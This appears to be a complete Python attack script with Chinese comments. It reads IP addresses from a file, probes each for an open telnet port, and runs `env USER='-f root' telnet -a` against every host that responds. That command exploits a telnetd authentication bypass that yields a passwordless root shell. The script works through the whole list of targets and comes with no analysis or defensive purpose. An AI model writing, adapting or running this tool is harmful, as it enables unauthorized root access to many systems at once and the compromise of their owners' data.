#!/usr/bin/env python3
import subprocess
import os
import sys
import time
import socket

# 配置部分：存放IP地址的文件名
IP_FILE = "ip_list.txt"
# 连接超时时间（秒）
CONNECT_TIMEOUT = 7

def get_ips(filename):
    if not os.path.exists(filename):
        print(f"错误: 找不到文件 '{filename}'，请先创建该文件并填入IP地址。")
        sys.exit(1)
    ips = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                ip = line.strip()
                if ip and not ip.startswith('#'):
                    ips.append(ip)
    except Exception as e:
        print(f"读取文件失败: {e}")
        sys.exit(1)
    return ips

def check_connectivity(ip, port=23, timeout=7):
    try:
        print(f"[*] 正在检测 {ip}:{port} 连通性 (超时 {timeout}秒)...")
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except socket.timeout:
        print(f"[-] 连接超时: {ip}")
        return False
    except (ConnectionRefusedError, OSError) as e:
        print(f"[-] 连接被拒绝或不可达: {ip} ({e})")
        return False
    except Exception as e:
        print(f"[-] 检测发生未知错误: {e}")
        return False

def run_telnet_session(ip):

    if not check_connectivity(ip, timeout=CONNECT_TIMEOUT):
        print(f"[-] 跳过 IP: {ip}")
        return
    command_str = f"env USER='-f root' telnet -a {ip}"
    print(f"\n{'='*30}")
    print(f"连接成功: {ip}")
    print(f"{'='*30}")
    print("提示: 操作完毕后输入 'quit' 来退出。")
    print("注意！！！若出现I don't hear you! 请输入ctrl+] 和 exit 来跳过这个ip")
    try:
        subprocess.call(command_str, shell=True)
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断，脚本停止运行。")
        sys.exit(1)

def main():
    target_file = sys.argv[1] if len(sys.argv) > 1 else IP_FILE
    ip_list = get_ips(target_file)
    if not ip_list:
        print("文件中没有找到有效的IP地址。")
        return
    print(f"共加载 {len(ip_list)} 个IP地址，准备依次执行 (连接超时设置: {CONNECT_TIMEOUT}秒)...")
    for index, ip in enumerate(ip_list, 1):
        print(f"\n### 进度: {index}/{len(ip_list)} ###")
        run_telnet_session(ip)
        
        print(f"[-] {ip} 会话已结束，等待 1 秒后继续...")
        time.sleep(1)
    print("\n[+] 所有IP已执行完毕。")

if __name__ == "__main__":
    main()

